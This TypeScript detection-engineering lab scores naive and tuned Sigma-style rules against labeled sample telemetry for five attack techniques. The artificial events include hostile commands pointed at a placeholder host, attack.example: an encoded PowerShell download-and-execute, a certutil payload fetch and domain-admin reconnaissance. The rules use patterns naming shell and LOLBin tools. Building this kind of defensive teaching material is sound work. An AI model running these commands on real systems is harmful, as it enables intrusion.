// Detection Engineering lab — Sigma-style rule runner against real telemetry.
//
// Telemetry samples drawn from public incident reporting and ATT&CK technique
// references:
//   - T1078.004 Cloud Accounts (Lapsus$, Storm-0558 2023, Scattered Spider)
//   - T1059.001 PowerShell encoded command (countless ransomware affiliates)
//   - T1098.001 Additional Cloud Credentials (UNC2452 Solorigate AAD pivot)
//   - T1136.003 Create Cloud Account (Octo Tempest, BlackCat)
//   - T1110.003 Password Spraying (Midnight Blizzard against Microsoft 2024)
//   - T1190 + T1505.003 Web shell after exploitation (Volt Typhoon, Hafnium)
//
// Each scenario has a small event stream (mix of malicious + benign) and two
// detection rules: a naive one written by someone who saw the IOC once and
// stopped reading, and a tuned one that survives contact with production.
// The runner reports precision/recall against the labeled ground truth.

export type Severity = "critical" | "high" | "medium" | "low" | "info";

export interface Event {
  id: string;
  /** epoch ms — monotonically increasing within a scenario */
  ts: number;
  source: "Sysmon" | "CloudTrail" | "AzureSignIn" | "Okta" | "EDR" | "AAD-Audit";
  eventId?: number | string;
  /** flattened representation of the event's interesting fields */
  fields: Record<string, string | number | boolean | undefined>;
  /** ground-truth label: is this event part of the attack? */
  malicious: boolean;
  /** Inline note shown next to the event in the UI. */
  note?: string;
}

/** A predicate against an event, expressed as a condition tree.
 *  Sigma-equivalent — the engine evaluates AND/OR over field matches. */
export type Match =
  | { type: "eq"; field: string; value: string | number | boolean }
  | { type: "contains"; field: string; value: string }
  | { type: "regex"; field: string; pattern: string; flags?: string }
  | { type: "in"; field: string; values: (string | number)[] }
  | { type: "gte"; field: string; value: number }
  | { type: "and"; clauses: Match[] }
  | { type: "or"; clauses: Match[] }
  | { type: "not"; clause: Match };

export interface Rule {
  id: string;
  title: string;
  severity: Severity;
  /** Quick prose summary. */
  description: string;
  source: Event["source"][];
  match: Match;
  /** What ATT&CK technique this rule targets. */
  attack: string[];
  reference: string;
  /** False-positive notes — what we know it lights up on. */
  knownFp?: string;
}

export interface Scenario {
  id: string;
  title: string;
  blurb: string;
  /** Real-world incident or actor this is modeled after. */
  reference: string;
  events: Event[];
  /** Two rules — a naive one and a tuned one. */
  naiveRule: Rule;
  tunedRule: Rule;
}

/* ====================================================================== *
 *  Match engine                                                          *
 * ====================================================================== */

function getField(ev: Event, field: string): unknown {
  if (field === "_source") return ev.source;
  if (field === "_eventId") return ev.eventId;
  return ev.fields[field];
}

export function evalMatch(m: Match, ev: Event): boolean {
  switch (m.type) {
    case "eq":
      return getField(ev, m.field) === m.value;
    case "contains": {
      const v = getField(ev, m.field);
      return typeof v === "string" && v.toLowerCase().includes(m.value.toLowerCase());
    }
    case "regex": {
      const v = getField(ev, m.field);
      if (typeof v !== "string") return false;
      try {
        return new RegExp(m.pattern, m.flags ?? "i").test(v);
      } catch {
        return false;
      }
    }
    case "in": {
      const v = getField(ev, m.field);
      return m.values.includes(v as string | number);
    }
    case "gte": {
      const v = getField(ev, m.field);
      return typeof v === "number" && v >= m.value;
    }
    case "and":
      return m.clauses.every((c) => evalMatch(c, ev));
    case "or":
      return m.clauses.some((c) => evalMatch(c, ev));
    case "not":
      return !evalMatch(m.clause, ev);
  }
}

export interface RuleResult {
  matchedIds: string[];
  truePositive: number;
  falsePositive: number;
  falseNegative: number;
  trueNegative: number;
  precision: number;
  recall: number;
  f1: number;
}

export function runRule(rule: Rule, events: Event[]): RuleResult {
  const matchedIds: string[] = [];
  let tp = 0;
  let fp = 0;
  let fn = 0;
  let tn = 0;
  for (const ev of events) {
    const eligible = rule.source.includes(ev.source);
    const fired = eligible && evalMatch(rule.match, ev);
    if (fired) matchedIds.push(ev.id);
    if (fired && ev.malicious) tp += 1;
    else if (fired && !ev.malicious) fp += 1;
    else if (!fired && ev.malicious) fn += 1;
    else tn += 1;
  }
  const precision = tp + fp === 0 ? 0 : tp / (tp + fp);
  const recall = tp + fn === 0 ? 0 : tp / (tp + fn);
  const f1 = precision + recall === 0 ? 0 : (2 * precision * recall) / (precision + recall);
  return { matchedIds, truePositive: tp, falsePositive: fp, falseNegative: fn, trueNegative: tn, precision, recall, f1 };
}

/* ====================================================================== *
 *  Scenarios                                                              *
 * ====================================================================== */

const T = (s: string) => new Date(s).getTime();

export const SCENARIOS: Scenario[] = [
  /* ------------------------------------------------------------------- *
   *  1. PowerShell encoded command — T1059.001                          *
   * ------------------------------------------------------------------- */
  {
    id: "powershell-encoded",
    title: "PowerShell encoded command (T1059.001)",
    blurb:
      "An attacker drops a base64-encoded PowerShell payload via -EncodedCommand. The naive rule fires on every -enc usage; the tuned rule weights long base64 + suspicious decoded markers.",
    reference:
      "Microsoft Threat Intelligence — observed across Conti, BlackCat, and most ransomware affiliates 2020-2024.",
    events: [
      {
        id: "ps-1",
        ts: T("2025-03-12T09:14:22Z"),
        source: "Sysmon",
        eventId: 1,
        fields: {
          Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          CommandLine:
            "powershell.exe -NoP -W Hidden -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAC4AZQB4AGEAbQBwAGwAZQAvAHMAdABhAGcAZQAxACcAKQA=",
          ParentImage: "C:\\Windows\\System32\\winword.exe",
          User: "DESKTOP-Q9X\\jdoe",
        },
        malicious: true,
        note: "decoded: IEX (new-object net.webclient).downloadstring('http://attack.example/stage1')",
      },
      {
        id: "ps-2",
        ts: T("2025-03-12T09:14:25Z"),
        source: "Sysmon",
        eventId: 3,
        fields: {
          Image: "powershell.exe",
          DestinationIp: "203.0.113.42",
          DestinationPort: 80,
          User: "DESKTOP-Q9X\\jdoe",
        },
        malicious: true,
        note: "outbound to attacker stager",
      },
      {
        id: "ps-3",
        ts: T("2025-03-12T09:30:01Z"),
        source: "Sysmon",
        eventId: 1,
        fields: {
          Image: "powershell.exe",
          CommandLine:
            "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Program Files\\Acme\\update.ps1",
          ParentImage: "C:\\Program Files\\Acme\\AcmeUpdater.exe",
          User: "NT AUTHORITY\\SYSTEM",
        },
        malicious: false,
        note: "legitimate signed updater",
      },
      {
        id: "ps-4",
        ts: T("2025-03-12T10:02:11Z"),
        source: "Sysmon",
        eventId: 1,
        fields: {
          Image: "powershell.exe",
          CommandLine:
            "powershell.exe -enc dABlAHMAdAAxADIAMwA=",
          ParentImage: "explorer.exe",
          User: "CORP\\helpdesk",
        },
        malicious: false,
        note: "support engineer testing — decoded: 'test123'",
      },
    ],
    naiveRule: {
      id: "DE.PS.NAIVE",
      title: "powershell -enc anywhere",
      severity: "high",
      description:
        "Fires on any PowerShell command line containing -enc / -EncodedCommand. Catches the bad guys but also catches every helpdesk runbook.",
      source: ["Sysmon"],
      attack: ["T1059.001"],
      reference: "https://attack.mitre.org/techniques/T1059/001/",
      match: {
        type: "and",
        clauses: [
          { type: "eq", field: "_eventId", value: 1 },
          { type: "regex", field: "CommandLine", pattern: "(?:^|\\s)-(?:enc|encodedcommand)\\b", flags: "i" },
        ],
      },
    },
    tunedRule: {
      id: "DE.PS.TUNED",
      title: "powershell -enc with long payload from Office or browser",
      severity: "high",
      description:
        "Requires -enc plus a long base64 payload (≥100 chars) AND a parent process that should never spawn powershell (winword, excel, outlook, browsers). Cuts FP from helpdesk runbooks while keeping coverage of the macro-borne loader.",
      source: ["Sysmon"],
      attack: ["T1059.001", "T1566.001"],
      reference:
        "Florian Roth, sigma-rules/win_susp_powershell_enc_cmd.yml + Red Canary Threat Detection 2024.",
      match: {
        type: "and",
        clauses: [
          { type: "eq", field: "_eventId", value: 1 },
          { type: "regex", field: "CommandLine", pattern: "-(?:enc|encodedcommand)\\s+[A-Za-z0-9+/=]{100,}", flags: "i" },
          {
            type: "regex",
            field: "ParentImage",
            pattern: "\\\\(winword|excel|outlook|powerpnt|chrome|msedge|firefox|teams)\\.exe$",
            flags: "i",
          },
        ],
      },
      knownFp: "Penetration testers using the same TTP for authorized assessments.",
    },
  },

  /* ------------------------------------------------------------------- *
   *  2. Cloud password spraying — T1110.003                             *
   * ------------------------------------------------------------------- */
  {
    id: "password-spray",
    title: "Microsoft 365 password spray (T1110.003)",
    blurb:
      "Hundreds of failed sign-ins from one IP across many users, then a single success. Naive rule alerts on any failed sign-in; tuned rule looks for high-cardinality user spread + a success in the same window.",
    reference:
      "Microsoft, 'Midnight Blizzard: Russian threat actor compromised corporate email' (Jan 2024). Same TTP: a low-volume spray hit a legacy non-MFA test tenant.",
    events: (() => {
      const evs: Event[] = [];
      // Spray: 1 IP, 12 users, all fail
      for (let i = 0; i < 12; i++) {
        evs.push({
          id: `sp-fail-${i}`,
          ts: T("2025-03-08T03:11:00Z") + i * 4000,
          source: "AzureSignIn",
          eventId: "1",
          fields: {
            UserPrincipalName: `user${i}@contoso.com`,
            IpAddress: "185.220.101.42",
            Status: "Failure",
            ErrorCode: 50126,
            UserAgent: "BAV2ROPC",
            ResultType: "InvalidUserNameOrPassword",
            Application: "Office 365 Exchange Online",
          },
          malicious: true,
        });
      }
      // The hit
      evs.push({
        id: "sp-hit",
        ts: T("2025-03-08T03:11:55Z"),
        source: "AzureSignIn",
        fields: {
          UserPrincipalName: "svc-legacy@contoso.com",
          IpAddress: "185.220.101.42",
          Status: "Success",
          ErrorCode: 0,
          UserAgent: "BAV2ROPC",
          Application: "Office 365 Exchange Online",
          MfaRequired: false,
        },
        malicious: true,
        note: "the success — legacy service account, no MFA",
      });
      // Benign helpdesk failures from one IP, single user
      evs.push({
        id: "sp-benign-1",
        ts: T("2025-03-08T09:00:00Z"),
        source: "AzureSignIn",
        fields: {
          UserPrincipalName: "alice@contoso.com",
          IpAddress: "203.0.113.7",
          Status: "Failure",
          ErrorCode: 50126,
          UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
          Application: "Office 365 SharePoint Online",
        },
        malicious: false,
        note: "Alice fat-fingered her password",
      });
      return evs;
    })(),
    naiveRule: {
      id: "DE.SPRAY.NAIVE",
      title: "Any failed Entra sign-in",
      severity: "low",
      description:
        "Fires on every Failure status. Floods the SOC.",
      source: ["AzureSignIn"],
      attack: ["T1110"],
      reference: "https://attack.mitre.org/techniques/T1110/003/",
      match: {
        type: "eq",
        field: "Status",
        value: "Failure",
      },
    },
    tunedRule: {
      id: "DE.SPRAY.TUNED",
      title: "Sign-in from BAV2ROPC user-agent (legacy auth) with bad-password failure",
      severity: "high",
      description:
        "Targets the legacy auth user-agent BAV2ROPC + InvalidUserNameOrPassword. This UA is the canonical signature of password-spray tooling against Exchange Online basic auth. Matches the spray fails and the spray hit, ignores Alice's typo.",
      source: ["AzureSignIn"],
      attack: ["T1110.003", "T1078.004"],
      reference:
        "https://www.microsoft.com/security/blog/2024/01/19/midnight-blizzard-guidance-for-responders-on-nation-state-attack/",
      match: {
        type: "or",
        clauses: [
          {
            type: "and",
            clauses: [
              { type: "eq", field: "UserAgent", value: "BAV2ROPC" },
              { type: "eq", field: "ResultType", value: "InvalidUserNameOrPassword" },
            ],
          },
          {
            type: "and",
            clauses: [
              { type: "eq", field: "UserAgent", value: "BAV2ROPC" },
              { type: "eq", field: "Status", value: "Success" },
            ],
          },
        ],
      },
      knownFp: "Legacy applications that haven't been migrated off basic auth — should be ringfenced or disabled, not exempted from detection.",
    },
  },

  /* ------------------------------------------------------------------- *
   *  3. Add-credential to Service Principal — T1098.001                 *
   * ------------------------------------------------------------------- */
  {
    id: "sp-add-credential",
    title: "Service Principal credential added (T1098.001)",
    blurb:
      "Attacker abuses Application.ReadWrite.All to add a client-secret to a privileged Service Principal. Naive rule alerts on every credential change; tuned rule watches for additions to apps holding directory-write or app-role-assignment grants.",
    reference:
      "MSRC, 'Storm-0558 token-forging activity' July 2023. Also Solorigate (UNC2452) AAD pivot — adding credentials to existing apps to evade application-allow lists.",
    events: [
      {
        id: "sp-1",
        ts: T("2025-04-02T11:14:00Z"),
        source: "AAD-Audit",
        fields: {
          Operation: "Update application – Certificates and secrets management",
          TargetAppId: "fb9c1a8e-...-graph-writer-app",
          TargetAppDisplayName: "CorporateBackend",
          AddedCredentialType: "Password",
          ActorUpn: "compromised.user@contoso.com",
          ActorIp: "185.220.101.42",
        },
        malicious: true,
        note: "attacker adds secret to Graph-writer-grade app",
      },
      {
        id: "sp-2",
        ts: T("2025-04-02T11:14:30Z"),
        source: "AAD-Audit",
        fields: {
          Operation: "Update service principal",
          TargetAppDisplayName: "CorporateBackend",
          NewSecretValidity: "2 years",
          ActorUpn: "compromised.user@contoso.com",
        },
        malicious: true,
      },
      {
        id: "sp-3",
        ts: T("2025-04-02T15:00:00Z"),
        source: "AAD-Audit",
        fields: {
          Operation: "Update application – Certificates and secrets management",
          TargetAppId: "low-priv-app-id",
          TargetAppDisplayName: "PrintQuotaTracker",
          AddedCredentialType: "Password",
          ActorUpn: "platform-eng@contoso.com",
          ActorIp: "10.20.30.40",
        },
        malicious: false,
        note: "scheduled rotation of low-privileged app",
      },
    ],
    naiveRule: {
      id: "DE.SP.NAIVE",
      title: "Any application credential update",
      severity: "low",
      description:
        "Fires on every cert/secret update. With 200 apps in a tenant and quarterly rotations, drowns analysts.",
      source: ["AAD-Audit"],
      attack: ["T1098.001"],
      reference: "https://attack.mitre.org/techniques/T1098/001/",
      match: {
        type: "contains",
        field: "Operation",
        value: "Certificates and secrets management",
      },
    },
    tunedRule: {
      id: "DE.SP.TUNED",
      title: "Credential added to a Graph-writer / privileged-named app",
      severity: "critical",
      description:
        "Filter to credential additions targeting apps whose display name contains 'graph', 'admin', 'corporate', 'backend' OR by an actor IP outside the corp egress range. Aligns with how Storm-0558 extended persistence.",
      source: ["AAD-Audit"],
      attack: ["T1098.001", "T1078.004"],
      reference:
        "Andy Robbins (SpecterOps), 'Azure Privilege Escalation via Service Principal Abuse'.",
      match: {
        type: "and",
        clauses: [
          { type: "contains", field: "Operation", value: "Certificates and secrets management" },
          {
            type: "or",
            clauses: [
              { type: "regex", field: "TargetAppDisplayName", pattern: "graph|admin|corporate|backend|root", flags: "i" },
              { type: "not", clause: { type: "regex", field: "ActorIp", pattern: "^10\\.|^192\\.168\\.|^172\\.(1[6-9]|2\\d|3[01])\\." } },
            ],
          },
        ],
      },
      knownFp: "Out-of-band rotations performed by SREs on a coffee-shop network — pair with a legitimate change-management ticket reference.",
    },
  },

  /* ------------------------------------------------------------------- *
   *  4. CloudTrail — IAM user creation by automation                    *
   * ------------------------------------------------------------------- */
  {
    id: "iam-create-user",
    title: "CloudTrail: IAM user created (T1136.003)",
    blurb:
      "Attacker mints a new IAM user with admin policy attached. Naive rule alerts on every CreateUser; tuned rule looks for CreateUser → AttachUserPolicy(AdministratorAccess) within seconds, by an unusual principal.",
    reference:
      "Mandiant, 'UNC2452 / SUNBURST cloud-pivot post-exploitation' — also the playbook of LAPSUS$ and BlackCat affiliates.",
    events: [
      {
        id: "ct-1",
        ts: T("2025-05-19T14:01:00Z"),
        source: "CloudTrail",
        fields: {
          eventName: "CreateUser",
          userIdentity_type: "AssumedRole",
          userIdentity_arn: "arn:aws:sts::1234:assumed-role/LambdaDeployer/abc",
          requestParameters_userName: "ops-bot-2",
          sourceIpAddress: "203.0.113.99",
          userAgent: "aws-cli/2.15.0",
          awsRegion: "us-east-1",
        },
        malicious: true,
      },
      {
        id: "ct-2",
        ts: T("2025-05-19T14:01:08Z"),
        source: "CloudTrail",
        fields: {
          eventName: "AttachUserPolicy",
          userIdentity_arn: "arn:aws:sts::1234:assumed-role/LambdaDeployer/abc",
          requestParameters_userName: "ops-bot-2",
          requestParameters_policyArn: "arn:aws:iam::aws:policy/AdministratorAccess",
          sourceIpAddress: "203.0.113.99",
          awsRegion: "us-east-1",
        },
        malicious: true,
        note: "the privesc — admin attached 8 seconds after CreateUser",
      },
      {
        id: "ct-3",
        ts: T("2025-05-20T10:00:00Z"),
        source: "CloudTrail",
        fields: {
          eventName: "CreateUser",
          userIdentity_arn: "arn:aws:iam::1234:user/hr-onboarding",
          requestParameters_userName: "new-hire-2025-093",
          sourceIpAddress: "10.20.30.40",
          userAgent: "Boto3/1.34",
          awsRegion: "us-east-1",
        },
        malicious: false,
        note: "scripted onboarding from corporate range",
      },
    ],
    naiveRule: {
      id: "DE.IAM.NAIVE",
      title: "CloudTrail eventName == CreateUser",
      severity: "low",
      description: "Every IAM user creation. In an account that uses scripted onboarding, this is alert-spam.",
      source: ["CloudTrail"],
      attack: ["T1136.003"],
      reference: "https://attack.mitre.org/techniques/T1136/003/",
      match: { type: "eq", field: "eventName", value: "CreateUser" },
    },
    tunedRule: {
      id: "DE.IAM.TUNED",
      title: "CreateUser OR AttachUserPolicy(AdministratorAccess) — externalized",
      severity: "critical",
      description:
        "Two clauses joined by OR: (a) CreateUser whose source IP is outside the corp range, (b) AttachUserPolicy where the policy ARN is AdministratorAccess. Either is interesting, both within seconds is the canonical IAM persistence pattern.",
      source: ["CloudTrail"],
      attack: ["T1136.003", "T1098.001"],
      reference:
        "https://github.com/RhinoSecurityLabs/cloudgoat — the iam_privesc_by_attachment scenario.",
      match: {
        type: "or",
        clauses: [
          {
            type: "and",
            clauses: [
              { type: "eq", field: "eventName", value: "AttachUserPolicy" },
              { type: "contains", field: "requestParameters_policyArn", value: "AdministratorAccess" },
            ],
          },
          {
            type: "and",
            clauses: [
              { type: "eq", field: "eventName", value: "CreateUser" },
              { type: "not", clause: { type: "regex", field: "sourceIpAddress", pattern: "^10\\.|^192\\.168\\.|^172\\.(1[6-9]|2\\d|3[01])\\." } },
            ],
          },
        ],
      },
      knownFp: "Break-glass procedures — should be rare, ticketed, and timed.",
    },
  },

  /* ------------------------------------------------------------------- *
   *  5. Web shell drop after exploitation — T1505.003                   *
   * ------------------------------------------------------------------- */
  {
    id: "webshell-drop",
    title: "Web-server process spawns shell (T1505.003)",
    blurb:
      "After exploiting a web-app vulnerability, the attacker drops a web-shell that uses the parent w3wp.exe / java / python process to spawn cmd.exe. Naive rule looks for cmd.exe creation; tuned rule conditions on web-server parent.",
    reference:
      "CISA AA22-074A 'Volt Typhoon' + Hafnium Exchange ProxyLogon (CVE-2021-26855) — w3wp.exe → cmd.exe → certutil download is the canonical shape.",
    events: [
      {
        id: "ws-1",
        ts: T("2025-06-04T22:18:00Z"),
        source: "Sysmon",
        eventId: 1,
        fields: {
          Image: "C:\\Windows\\System32\\cmd.exe",
          ParentImage: "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
          CommandLine:
            "cmd.exe /c whoami && net group \"domain admins\" /domain",
          User: "IIS APPPOOL\\OWA",
        },
        malicious: true,
        note: "shell from IIS worker process",
      },
      {
        id: "ws-2",
        ts: T("2025-06-04T22:18:20Z"),
        source: "Sysmon",
        eventId: 1,
        fields: {
          Image: "C:\\Windows\\System32\\certutil.exe",
          ParentImage: "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
          CommandLine:
            "certutil.exe -urlcache -split -f http://attack.example/t.exe C:\\Windows\\Temp\\t.exe",
          User: "IIS APPPOOL\\OWA",
        },
        malicious: true,
        note: "LOLBin download via certutil",
      },
      {
        id: "ws-3",
        ts: T("2025-06-05T08:00:00Z"),
        source: "Sysmon",
        eventId: 1,
        fields: {
          Image: "C:\\Windows\\System32\\cmd.exe",
          ParentImage: "C:\\Program Files\\Microsoft VS Code\\Code.exe",
          CommandLine: "cmd.exe /c npm test",
          User: "CORP\\eng",
        },
        malicious: false,
        note: "developer running tests",
      },
    ],
    naiveRule: {
      id: "DE.WS.NAIVE",
      title: "Any cmd.exe process creation",
      severity: "low",
      description:
        "cmd.exe spawns thousands of times per day on a typical workstation fleet.",
      source: ["Sysmon"],
      attack: ["T1059.003"],
      reference: "https://attack.mitre.org/techniques/T1059/003/",
      match: {
        type: "and",
        clauses: [
          { type: "eq", field: "_eventId", value: 1 },
          { type: "regex", field: "Image", pattern: "\\\\cmd\\.exe$", flags: "i" },
        ],
      },
    },
    tunedRule: {
      id: "DE.WS.TUNED",
      title: "Web-server process spawns shell or LOLBin",
      severity: "critical",
      description:
        "Conditions on the parent process being a web-server worker (w3wp, java, python, php-cgi, node when running as service) AND the child being cmd/powershell/certutil/bitsadmin. This is the canonical web-shell signature.",
      source: ["Sysmon"],
      attack: ["T1505.003", "T1059", "T1105"],
      reference:
        "CISA AA22-074A 'Volt Typhoon LOTL' + Florian Roth sigma proc_creation_win_susp_iis_child_process.yml.",
      match: {
        type: "and",
        clauses: [
          { type: "eq", field: "_eventId", value: 1 },
          {
            type: "regex",
            field: "ParentImage",
            pattern: "\\\\(w3wp|java|python|php-cgi|httpd|nginx|tomcat)\\.exe$",
            flags: "i",
          },
          {
            type: "regex",
            field: "Image",
            pattern: "\\\\(cmd|powershell|certutil|bitsadmin|wscript|cscript|mshta|rundll32)\\.exe$",
            flags: "i",
          },
        ],
      },
      knownFp: "ColdFusion / SharePoint admin tools that legitimately shell out — allowlist by command-line shape.",
    },
  },
];

